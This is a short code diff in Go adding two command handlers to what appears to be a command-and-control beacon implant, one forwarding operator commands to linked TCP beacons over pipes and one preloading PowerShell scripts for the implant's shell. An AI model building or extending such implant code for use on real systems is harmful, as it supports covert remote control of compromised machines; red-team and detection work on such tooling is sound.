@@ -165,6 +165,13 @@ func main() {
 											// packet.PushResult(packet.EncryptPacket(finalPacket))
 											resultBuf = append(resultBuf, finalPacket...)
 										}
+									case packet.CMD_TYPE_PIPE_FWD:
+										beaconId, message := packet.ParsePipeForward(cmdBuf)
+										fmt.Printf("Forwarding commands to tcp beacon %d", beaconId)
+										packet.SendLinkPacket(beaconId, message)
+									case packet.CMD_TYPE_PWSH_IMPORT:
+										// fmt.Printf("%x", cmdBuf)
+										packet.SetShellPreLoadedFile(cmdBuf)
 									case packet.CMD_TYPE_EXIT:
 										os.Exit(0)
 									default:
